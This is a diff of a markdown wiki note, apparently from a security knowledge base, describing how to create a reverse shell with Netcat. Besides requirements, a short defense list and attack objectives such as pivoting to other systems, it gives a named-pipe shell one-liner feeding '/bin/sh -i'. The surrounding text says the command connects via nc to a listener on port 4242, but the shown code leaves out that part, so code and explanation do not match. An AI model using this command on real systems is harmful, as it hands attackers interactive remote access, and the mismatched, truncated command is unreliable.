@@ -32,11 +32,15 @@ Technical Explanation: A reverse shell is created by connecting to a remote syst
 
 Business Value: A reverse shell can be used to gain remote access to a compromised system, allowing an attacker to steal sensitive data or use the system as a foothold for further attacks. By understanding how a reverse shell is created using Netcat, organizations can better defend against these types of attacks.
 
+ 
+
 ## Requirements
 
 1. Authenticated access to the compromised system
 
 1. Netcat installed on the compromised system
+
+ 
 
 ## Defense
 
@@ -45,6 +49,8 @@ Business Value: A reverse shell can be used to gain remote access to a compromis
 1. Monitor network traffic for suspicious activity
 
 1. Implement strong authentication mechanisms to prevent unauthorized access
+
+ 
 
 ## Objectives
 
@@ -56,11 +62,19 @@ Business Value: A reverse shell can be used to gain remote access to a compromis
 
 1. Pivot to other systems on the network
 
+ 
+
 # Instructions
 
 1. This command creates a reverse shell connection to a remote host. It first removes any existing file named 'f' in the '/tmp' directory. Then, it creates a named pipe called 'f' in the '/tmp' directory. Next, it pipes the output of the 'cat' command (which reads from the named pipe) to the '/bin/sh' command with the '-i' option (which starts an interactive shell). Finally, it redirects the output of the 'nc' command (which establishes a TCP connection to the remote host) to the named pipe 'f'.
 
+ 
+
+
+
 **Code**: [[rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i ]]
+
+
 
 > The command takes no arguments, but it requires a listener on the remote host to be waiting for the connection. The listener should be set up to receive incoming connections on port 4242. Once the connection is established, the attacker can execute commands on the remote host as if they were sitting at a terminal on that machine.
 
@@ -79,3 +93,5 @@ Business Value: A reverse shell can be used to gain remote access to a compromis
 - [[Netcat BusyBox]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
